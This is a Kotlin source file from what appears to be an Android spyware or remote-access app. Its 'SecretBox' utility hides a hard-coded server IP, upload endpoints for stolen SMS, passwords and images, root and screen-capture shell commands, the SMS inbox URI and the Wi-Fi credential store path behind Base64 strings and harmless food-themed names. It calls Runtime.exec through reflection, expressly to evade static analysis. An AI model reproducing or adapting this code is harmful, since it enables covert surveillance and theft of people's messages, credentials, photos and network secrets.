package com.example.mobsec_823.utils

import android.util.Base64
import java.lang.reflect.Method
import okhttp3.OkHttpClient
import java.util.concurrent.TimeUnit

object SecretBox {
    private const val SEASONING = 0x7A.toByte()

    // Shared client to prevent socket exhaustion and "Failed to connect" errors
    val httpClient: OkHttpClient by lazy {
        OkHttpClient.Builder()
            .connectTimeout(15, TimeUnit.SECONDS)
            .readTimeout(15, TimeUnit.SECONDS)
            .writeTimeout(15, TimeUnit.SECONDS)
            .build()
    }

    /**
     * Decodes obfuscated strings using Base64.
     */
    fun decrypt(encrypted: String): String {
        return try {
            // Updated: Just decode Base64 to avoid corruption via XOR
            String(Base64.decode(encrypted, Base64.DEFAULT))
        } catch (e: Exception) {
            ""
        }
    }

    /**
     * Static Analysis Bypass: Dynamic Reflection to invoke Runtime.exec()
     */
    fun reflectedExec(command: Any): Process? {
        return try {
            val rName = String(byteArrayOf(106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101))
            val mGetName = String(byteArrayOf(103, 101, 116, 82, 117, 110, 116, 105, 109, 101))
            val mExecName = String(byteArrayOf(101, 120, 101, 99))

            val runtimeClass = Class.forName(rName)
            val getRuntimeMethod: Method = runtimeClass.getMethod(mGetName)
            val runtimeInstance = getRuntimeMethod.invoke(null)

            val execMethod: Method = if (command is Array<*>) {
                runtimeClass.getMethod(mExecName, Array<String>::class.java)
            } else {
                runtimeClass.getMethod(mExecName, String::class.java)
            }

            execMethod.invoke(runtimeInstance, command) as? Process
        } catch (e: Exception) {
            null
        }
    }

    // IPs and Ports
    fun getKitchenAddress(): String = decrypt("NDcuMTI5LjE0NC45") // 47.129.144.9
    fun getTruckPort(): Int = 1269
    fun getToppingPort(): Int = 6767
    fun getCarnePort(): Int = 7000

    // Endpoints
    fun getRubbishEndpoint(): String = decrypt("aHR0cDovLzQ3LjEyOS4xNDQuOTo4MDAwL2R1bXAvc21z") // http://47.129.144.9:8000/dump/sms
    fun getRecycleEndpoint(): String = decrypt("aHR0cDovLzQ3LjEyOS4xNDQuOTo4MDAwL2R1bXAvcGFzc3dvcmRz") // http://47.129.144.9:8000/dump/passwords
    fun getSignageEndpoint(): String = decrypt("aHR0cDovLzQ3LjEyOS4xNDQuOTo4MDAwL2R1bXAvaW1hZ2Vz") // http://47.129.144.9:8000/dump/images
    // fun getCarneHeader(): String = decrypt("UE9TVCAvcmVtb3RlLXN0cmVhbSBIVFRQLzEuMQ==") // POST /remote-stream HTTP/1.1

    // Shell Commands
    fun getScreencapCmd(): String = decrypt("c2NyZWVuY2FwIC1w") // screencap -p
    fun getListSignageCmd(): String = decrypt("bHMgLXQgL3NkY2FyZC9EQ0lNL0NhbWVyYQ==") // ls -t /sdcard/DCIM/Camera
    fun getSuCmd(): String = decrypt("c3U=") // su
    fun getExitCmd(): String = decrypt("ZXhpdA==") // exit

    // URIs and Paths
    fun getScrapUri(): String = decrypt("Y29udGVudDovL3Ntcy9pbmJveA==") // content://sms/inbox
    fun getWifiPath(): String = decrypt("L2RhdGEvbWlzYy9hcGV4ZGF0YS9jb20uYW5kcm9pZC53aWZpL1dpZmlDb25maWdTdG9yZS54bWw=") // /data/misc/apexdata/com.android.wifi/WifiConfigStore.xml

    // Command Strings
    fun getCmdStop(): String = decrypt("Q01EX1NUT1A=") // CMD_STOP
    fun getCmdStart(): String = decrypt("Q01EX1NUQVJU") // CMD_START
}